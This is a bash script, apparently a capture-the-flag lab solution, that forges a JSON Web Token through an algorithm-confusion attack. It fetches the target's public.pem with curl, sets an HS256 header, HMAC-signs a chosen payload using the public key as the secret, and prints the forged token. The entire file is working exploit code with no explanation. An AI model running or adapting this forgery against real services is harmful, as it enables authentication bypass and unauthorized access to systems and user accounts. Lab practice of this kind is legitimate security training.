#!/usr/bin/env bash
ip="10.10.188.75"
modifiedheader="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
modifiedheaderfile="modifiedheader.txt"
modifiedsecretfile="modifiedsecret.txt"
newjwtfile="newjwt.txt"
payload="eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNTk1MzY0MjEzLCJleHAiOjE1OTUzNjQzMzMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ"
payloadfile="payload.txt"
pemfile="public.pem"
hexpemfile="hexpublic.pem"
hexkeyfile="hexkey.txt"
pythonfilename="jwtTryHackMe.py"

curl "http://${ip}/public.pem" -o ${pemfile}
echo "${modifiedheader}" > ${modifiedheaderfile}
echo "${payload}" > ${payloadfile}
cat ${pemfile} | xxd -p | tr -d "\\n" > ${hexpemfile}
echo -n "$(cat ${modifiedheaderfile}).$(cat ${payloadfile})" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat ${hexpemfile}) | awk '{print $2}' > ${hexkeyfile}
export HEXKEY=$(cat ${hexkeyfile})
python3 ${pythonfilename} > ${modifiedsecretfile}
echo "$(cat ${modifiedheaderfile}).$(cat ${payloadfile}).$(cat ${modifiedsecretfile})" > ${newjwtfile}
printf "New JWT Token:\n"
cat ${newjwtfile}